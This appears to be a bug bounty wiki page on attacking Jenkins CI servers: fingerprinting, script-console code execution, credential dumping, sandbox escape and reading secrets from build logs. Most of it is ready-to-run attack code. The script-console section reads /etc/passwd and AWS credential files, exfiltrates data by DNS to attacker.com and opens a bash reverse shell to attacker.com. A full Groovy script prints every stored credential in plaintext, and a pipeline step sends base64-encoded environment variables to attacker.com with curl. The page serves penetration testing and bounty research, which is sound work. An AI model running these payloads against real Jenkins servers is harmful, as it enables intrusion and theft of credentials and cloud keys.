> Source: https://bugbounty.info/Attack-Surface/CI-CD/Jenkins

# Jenkins

Jenkins is the old guard of CI/CD and it's everywhere in enterprise environments. It's also consistently misconfigured. The script console gives you direct Groovy execution on the master node - if you can reach it without auth, that's a crit. Credential dumping, Groovy sandbox escape, and CLI exposure are the other main vectors.

## Fingerprinting Jenkins

```bash
/jenkins/ or /ci/ -- common path prefixes
X-Jenkins: header in HTTP responses
X-Hudson: older versions
/login -- Jenkins login page with version disclosure
/api/json -- Jenkins API, may be accessible without auth
/computer/api/json -- node info
```

```bash
# Check if Jenkins API is open
curl -s https://jenkins.target.com/api/json | python3 -m json.tool
 
# Get job list
curl -s https://jenkins.target.com/api/json?tree=jobs[name,url]
 
# Check version
curl -s -I https://jenkins.target.com/ | grep X-Jenkins
```

## Script Console: Direct Code Execution

The script console at `/script` lets admins run arbitrary Groovy code on the Jenkins master. If you reach it without auth, you have RCE.

```groovy
// Check what user you are
println "whoami".execute().text
 
// Get environment variables (includes secrets injected into build env)
System.getenv().each { k, v -> println "$k=$v" }
 
// Read a file
println new File("/etc/passwd").text
println new File("/var/lib/jenkins/.aws/credentials").text
 
// DNS exfil if HTTP is blocked
"nslookup \$(whoami).attacker.com".execute()
 
// Reverse shell
def cmd = "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
["bash", "-c", cmd].execute()
```

## Credential Dumping

Jenkins stores credentials in an encrypted form but the master's secret key is on disk. If you have script console access or file read, you can decrypt them.

```groovy
// List all credentials via script console
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.impl.*
 
def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
    com.cloudbees.plugins.credentials.common.StandardCredentials.class,
    Jenkins.instance,
    null,
    null
)
 
creds.each { c ->
    if (c instanceof UsernamePasswordCredentialsImpl) {
        println "Username/Password: ${c.id} -- ${c.username} / ${c.password.plainText}"
    } else if (c instanceof StringCredentialsImpl) {
        println "Secret text: ${c.id} -- ${c.secret.plainText}"
    } else if (c instanceof FileCredentialsImpl) {
        println "Secret file: ${c.id}"
        println new String(c.data)
    } else if (c instanceof BasicSSHUserPrivateKey) {
        println "SSH key: ${c.id} -- ${c.privateKey}"
    }
}
```

## Groovy Sandbox Escape

Jenkins Pipelines run in a Groovy sandbox - only approved methods are allowed. But sandboxes can be escaped via:

1. **Unapproved script approval** - check `/scriptApproval/` for pending approvals that might let you inject methods
2. **Pipeline script from SCM** - if a job pulls its Jenkinsfile from a repo you can write to, you control the pipeline
3. **Shared libraries** - if a shared library comes from a repo you control, you can modify it to escape the sandbox

```groovy
// These are sandbox-restricted but sometimes approved by admins
// Check /scriptApproval/ for what's been approved in this Jenkins instance
@Grab('some:dependency:version')  // can load external code
 
// If you get outside the sandbox (e.g., via Jenkinsfile in SCM):
node {
    sh "curl https://attacker.com/ -d \"\$(env | base64)\""
}
```

## Unauthenticated Access

Some Jenkins instances have authentication disabled or have the "Anyone can do anything" authorization strategy. Check:

```bash
# Try accessing without credentials
curl https://jenkins.target.com/api/json
curl https://jenkins.target.com/script
 
# Check if anonymous users can read build logs (often yes even when auth is required for other things)
curl https://jenkins.target.com/job/JOB_NAME/BUILD_NUMBER/consoleText
 
# Jenkins CLI - sometimes accessible without auth
curl https://jenkins.target.com/jnlpJars/jenkins-cli.jar -o jenkins-cli.jar
java -jar jenkins-cli.jar -s https://jenkins.target.com/ who-am-i
```

## Build Log Secrets

Even without script console access, build logs are often publicly readable and contain leaked secrets:

```bash
# Get build logs
curl https://jenkins.target.com/job/JOB_NAME/lastBuild/consoleText
curl https://jenkins.target.com/job/JOB_NAME/BUILD_NUMBER/consoleText
 
# Look for:
# + export SECRET=value (shell xtrace output)
# [Pipeline] withCredentials -- sometimes the value slips through
# Error messages containing credential values
# Environment dumps from debug steps
```

## Jenkins CLI Exploitation

```bash
# Connect-node can sometimes be used to probe internal network
java -jar jenkins-cli.jar -s https://jenkins.target.com/ connect-node NODE_NAME
 
# If you have credentials:
java -jar jenkins-cli.jar -s https://jenkins.target.com/ -auth user:password \
  groovy = < exploit.groovy
```

## Public Reports

- Jenkins script console exposed without authentication allows remote code execution - [HackerOne #1005252](https://hackerone.com/reports/1005252)
- Unauthenticated Jenkins API exposes build history and environment variables - [HackerOne #358572](https://hackerone.com/reports/358572)
- Jenkins credential store dump via script console on misconfigured enterprise instance - [HackerOne Hacktivity search](https://hackerone.com/hacktivity?querystring=jenkins+credentials+dump)
- Build log for public Jenkins job reveals AWS access key via shell xtrace - [HackerOne #889930](https://hackerone.com/reports/889930)

## Related

- [Secret Leakage](../../Attack-Surface/CI-CD/Secret-Leakage) - build logs and credential masking failures
- [CD Overview](../../)
- [AWS IAM Privesc](../../Attack-Surface/Cloud/AWS/IAM-Privilege-Escalation) - what to do with the cloud creds you dump
